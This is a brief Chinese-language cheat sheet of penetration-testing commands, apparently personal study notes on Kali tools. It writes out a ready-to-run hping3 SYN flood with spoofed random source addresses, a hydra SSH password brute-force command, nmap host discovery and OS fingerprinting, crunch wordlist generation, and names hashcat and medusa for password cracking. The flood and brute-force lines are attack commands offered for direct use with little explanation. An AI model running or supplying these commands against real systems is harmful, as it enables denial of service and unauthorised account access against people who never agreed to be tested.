- 使用随机地址对目标ip地址进行DOS(泛洪攻击)
hping3 -S -U --flood -V --random-source 192.168.1.9
- 对ssh进行暴力破解
hydra -l user -P password.txt -e ns -t IP ssh
- 扫描局域网主机与主机指纹识别（操作系统等检测）
nmap -sP 192.168.1.0/24
nmap -sS -A 192.168.1.9
- 生成密码字典
crunch 1 10
crunch 4 4 0123456789 [dict.txt]
- 基于cpu与gpu的破解对比
hashcat, pyrid
- ftp破解
medusa, x-hydra
- kali install in usb
universal usb install